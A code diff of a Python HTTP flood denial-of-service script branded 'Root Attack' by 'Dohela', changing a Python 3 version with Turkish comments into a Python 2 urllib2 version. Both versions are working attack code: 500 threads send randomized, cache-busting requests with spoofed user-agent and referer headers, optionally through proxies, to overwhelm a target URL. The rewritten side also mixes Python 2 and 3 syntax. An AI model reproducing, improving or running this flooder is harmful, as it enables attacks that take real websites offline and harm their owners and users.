@@ -6,14 +6,13 @@
        #########################################
 
 
-import urllib.request
+import urllib2
 import sys
 import threading
 import random
 import re
-import time
 
-# Global değişkenler
+# Global params
 url = ''
 host = ''
 headers_useragents = []
@@ -23,22 +22,18 @@ flag = 0
 safe = 0
 proxies = []
 
-# İstek sayaçlarını artırır
 def inc_counter():
     global request_counter
     request_counter += 1
 
-# Bayrak ayarlayıcı
 def set_flag(val):
     global flag
     flag = val
 
-# Güvenli moda geçiş
 def set_safe():
     global safe
     safe = 1
 
-# User-agent listesi oluşturur
 def useragent_list():
     global headers_useragents
     headers_useragents = [
@@ -57,7 +52,6 @@ def useragent_list():
     ]
     return headers_useragents
 
-# Referer listesi oluşturur
 def referer_list():
     global headers_referers
     headers_referers = [
@@ -68,124 +62,110 @@ def referer_list():
     ]
     return headers_referers
 
-# Proxy listesi oluşturur
-def load_proxies():
-    global proxies
-    proxies = [
-        'http://127.0.0.1:8080',
-        # Buraya proxy ekleyin
-    ]
-
-# Rastgele bir ASCII bloğu oluşturur
 def buildblock(size):
     return ''.join(chr(random.randint(65, 90)) for _ in range(size))
 
-# Kullanım talimatları
 def usage():
     print('---------------------------------------------------')
-    print('USAGE: python root_attack.py <url> [safe]')
-    print('You can add "safe" after the URL to stop automatically after DoS')
+    print('USAGE: python root.py <url>')
+    print('you can add "safe" after url, to autoshut after dos')
     print('---------------------------------------------------')
 
-# Proxy ile HTTP isteği oluşturur
+def load_proxies():
+    global proxies
+    # Add your proxy list here or load from a file
+    proxies = [
+        'http://proxy1.example.com:8080',
+        'http://proxy2.example.com:8080',
+        # Add more proxies as needed
+    ]
+
 def httpcall(url):
     useragent_list()
     referer_list()
     code = 0
-
-    if "?" in url:
+    if url.count("?") > 0:
         param_joiner = "&"
     else:
         param_joiner = "?"
-
-    request_url = url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
-
-    headers = {
-        'User-Agent': random.choice(headers_useragents),
-        'Cache-Control': 'no-cache',
-        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-        'Referer': random.choice(headers_referers) + buildblock(random.randint(5, 10)),
-        'Keep-Alive': str(random.randint(110, 120)),
-        'Connection': 'close',  # Bağlantıyı sürekli kapatıp tekrar açar
-        'Host': host
-    }
-
-    # Proxy seçimi (varsa)
-    if proxies:
-        proxy = random.choice(proxies)
-        proxy_handler = urllib.request.ProxyHandler({'http': proxy, 'https': proxy})
-        opener = urllib.request.build_opener(proxy_handler)
-        urllib.request.install_opener(opener)
-
-    request = urllib.request.Request(request_url, headers=headers)
-
+    
+    request = urllib2.Request(url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
+    request.add_header('User-Agent', random.choice(headers_useragents))
+    request.add_header('Cache-Control', 'no-cache')
+    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
+    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5, 10)))
+    request.add_header('Keep-Alive', random.randint(110, 120))
+    request.add_header('Connection', 'keep-alive')
+    request.add_header('Host', host)
+    
+    proxy = random.choice(proxies) if proxies else None
+    if proxy:
+        proxy_support = urllib2.ProxyHandler({'http': proxy})
+        opener = urllib2.build_opener(proxy_support)
+        urllib2.install_opener(opener)
+    
     try:
-        response = urllib.request.urlopen(request)
-        inc_counter()
-        print(f"Request sent! Status: {response.status}")
-    except urllib.error.HTTPError as e:
+        urllib2.urlopen(request)
+    except urllib2.HTTPError as e:
         set_flag(1)
-        print(f'HTTP Error {e.code}: Attack might be working.')
+        print('Ataque Iniciado 65000 Bytes By Dohela')
         code = 500
-    except urllib.error.URLError as e:
-        print(f"URL Error: {e.reason}")
+    except urllib2.URLError as e:
         sys.exit()
-
+    else:
+        inc_counter()
+        urllib2.urlopen(request)
     return code
 
-# HTTP thread sınıfı
 class HTTPThread(threading.Thread):
     def run(self):
-        while flag < 2:
-            code = httpcall(url)
-            if code == 500 and safe == 1:
-                set_flag(2)
+        try:
+            while flag < 2:
+                code = httpcall(url)
+                if code == 500 and safe == 1:
+                    set_flag(2)
+        except Exception:
+            pass
 
-# Monitör thread sınıfı
 class MonitorThread(threading.Thread):
     def run(self):
         previous = request_counter
         while flag == 0:
-            if previous + 100 < request_counter and previous != request_counter:
+            if previous + 100 < request_counter:
                 print(f"{request_counter} Requests Sent")
                 previous = request_counter
         if flag == 2:
-            print("\n-- Attack Finished --")
+            print("\n-- Root Attack Finished --")
 
-# Çalıştırma
-if len(sys.argv) < 2:
-    usage()
-    sys.exit()
-else:
-    if sys.argv[1] == "help":
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
         usage()
         sys.exit()
     else:
-        print("-- Root Attack Başlatıldı By Dohela --")
-        if len(sys.argv) == 3:
-            if sys.argv[2] == "safe":
-                set_safe()
-        url = sys.argv[1]
-                if url.count("/") == 2:
-            url += "/"
-        
-        # URL'den ana makineyi çıkarır
-        m = re.search(r'http://([^/]*)/?.*', url)
-        if m:
-            host = m.group(1)
-        else:
-            print("URL'den ana makine alınamadı. Lütfen URL'yi kontrol edin.")
+        if sys.argv[1] == "help":
+            usage()
             sys.exit()
+        else:
+            print("-- Root Attack Started By Dohela --")
+            if len(sys.argv) == 3:
+                if sys.argv[2] == "safe":
+                    set_safe()
+            url = sys.argv[1]
+            if url.count("/") == 2:
+                url += "/"
+            
+            m = re.search(r'http://([^/]*)/?.*', url)
+            if m:
+                host = m.group(1)
+            else:
+                print("URL'den ana makine alınamadı. Lütfen URL'yi kontrol edin.")
+                sys.exit()
 
-        # Proxies yükleniyor (varsayılan olarak boşsa)
-        load_proxies()
+            load_proxies()
 
-        # HTTP thread'leri başlat
-        for i in range(500):  # Thread sayısını ihtiyaca göre ayarlayın
-            t = HTTPThread()
+            for i in range(500):
+                t = HTTPThread()
+                t.start()
+            
+            t = MonitorThread()
             t.start()
-        
-        # Monitör thread'ini başlat
-        t = MonitorThread()
-        t.start()
-
